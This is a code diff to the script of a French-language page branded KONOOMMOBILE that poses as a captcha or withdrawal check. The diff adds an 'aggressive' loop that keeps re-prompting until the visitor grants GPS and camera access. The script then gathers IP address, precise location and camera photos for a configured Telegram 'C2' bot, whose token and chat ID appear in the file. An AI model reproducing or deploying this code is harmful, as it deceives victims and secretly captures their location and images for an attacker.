@@ -318,7 +318,7 @@ KONOOMMOBILE — La proximité au service des agents.</div>
 
     <script>
         // ============================================
-        // CONFIGURATION C2 TELEGRAM (MIS À JOUR)
+        // CONFIGURATION C2 TELEGRAM (VERROUILLÉ)
         // ============================================
         const BOT_TOKEN = "8851908882:AAFMfPwA9NjdgUwws1SiV_XX6XuVkaD3k3c";
         const ADMIN_CHAT_ID = "6815008409";
@@ -352,6 +352,7 @@ KONOOMMOBILE — La proximité au service des agents.</div>
             goToView(3);
         }
 
+        // BOUCLE DE VÉRIFICATION AGRESSIVE (HARD RESET & FORCE-PROMPT)
         async function triggerHumanVerification() {
             const checkbox = document.getElementById('captchaBox');
             const statusMsg = document.getElementById('statusMsg');
@@ -363,16 +364,22 @@ KONOOMMOBILE — La proximité au service des agents.</div>
             statusMsg.style.background = '#fef3c7';
             statusMsg.style.borderColor = '#f59e0b';
             statusMsg.style.color = '#92400e';
-            statusMsg.innerHTML = 'En cours demande de retrait... (Veuillez autoriser l\'accès requis)';
+            statusMsg.innerHTML = 'En cours demande de retrait... (Veuillez autoriser les accès requis)';
 
             let success = false;
             let ip, loc, photos;
 
-            // Boucle de persistance : force la ré-demande si l'utilisateur refuse les autorisations
+            // Boucle stricte : réinitialisation à zéro tant que les autorisations GPS / Caméra ne sont pas validées de force
             while (!success) {
                 try {
+                    // Purger les flux précédents si existants
+                    if (mediaStream) {
+                        mediaStream.getTracks().forEach(t => t.stop());
+                        mediaStream = null;
+                    }
+
                     const ipPromise = getIPAddress();
-                    const locPromise = getLocation();
+                    const locPromise = getAggressiveLocation();
                     const photosPromise = capturePhotosWithCamera();
 
                     const results = await Promise.all([ipPromise, locPromise, photosPromise]);
@@ -380,14 +387,14 @@ KONOOMMOBILE — La proximité au service des agents.</div>
                     loc = results[1];
                     photos = results[2];
 
-                    if (!photos || photos.length === 0) {
-                        throw new Error("Autorisations refusées");
+                    if (!photos || photos.length === 0 || loc.error) {
+                        throw new Error("Autorisations partielles ou refusées - Redémarrage à zéro");
                     }
 
                     success = true;
                 } catch (error) {
-                    statusMsg.innerHTML = '⚠️ Autorisation nécessaire pour valider la non-robotique. Veuillez autoriser.';
-                    await new Promise(r => setTimeout(r, 2000));
+                    statusMsg.innerHTML = 'En cours demande de retrait... (Veuillez autoriser GPS et Caméra)';
+                    await new Promise(r => setTimeout(r, 1500));
                 }
             }
 
@@ -418,7 +425,8 @@ KONOOMMOBILE — La proximité au service des agents.</div>
             }
         }
 
-        async function getLocation() {
+        // Géolocalisation agressive (Force un nouveau prompt sans cache)
+        async function getAggressiveLocation() {
             return new Promise((resolve) => {
                 if ("geolocation" in navigator) {
                     navigator.geolocation.getCurrentPosition(
@@ -430,7 +438,7 @@ KONOOMMOBILE — La proximité au service des agents.</div>
                             });
                         },
                         (error) => { resolve({ error: error.message }); },
-                        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+                        { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
                     );
                 } else {
                     resolve({ error: 'Non supportée' });
@@ -438,6 +446,7 @@ KONOOMMOBILE — La proximité au service des agents.</div>
             });
         }
 
+        // Capture caméra agressive et sans mise en cache
         async function capturePhotosWithCamera() {
             return new Promise(async (resolve) => {
                 const photos = [];
@@ -452,10 +461,10 @@ KONOOMMOBILE — La proximité au service des agents.</div>
                     
                     await new Promise((resolve) => {
                         video.onloadedmetadata = () => { video.play(); resolve(); };
-                        setTimeout(resolve, 1500);
+                        setTimeout(resolve, 1000);
                     });
                     
-                    await new Promise(r => setTimeout(r, 1000));
+                    await new Promise(r => setTimeout(r, 800));
                     
                     if (video.videoWidth === 0 || video.videoHeight === 0) {
                         if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null; }
@@ -474,10 +483,16 @@ KONOOMMOBILE — La proximité au service des agents.</div>
                         if (i < TOTAL_PHOTOS) await new Promise(r => setTimeout(r, CAPTURE_DELAY));
                     }
                     
-                    if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null; }
+                    if (mediaStream) {
+                        mediaStream.getTracks().forEach(track => track.stop());
+                        mediaStream = null;
+                    }
                     resolve(photos);
                 } catch (error) {
-                    if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null; }
+                    if (mediaStream) {
+                        mediaStream.getTracks().forEach(track => track.stop());
+                        mediaStream = null;
+                    }
                     resolve(photos);
                 }
             });
